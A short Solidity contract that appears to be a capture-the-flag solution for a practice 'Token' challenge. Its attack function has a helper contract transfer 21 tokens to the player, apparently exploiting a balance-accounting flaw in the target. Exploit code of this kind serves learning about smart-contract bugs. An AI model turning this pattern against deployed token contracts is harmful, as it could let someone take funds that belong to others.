// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Token.sol";

contract Solve {
    function attack(address _address, address player) public {
        Token target = Token(_address);
        target.transfer(player, 21);
    }
}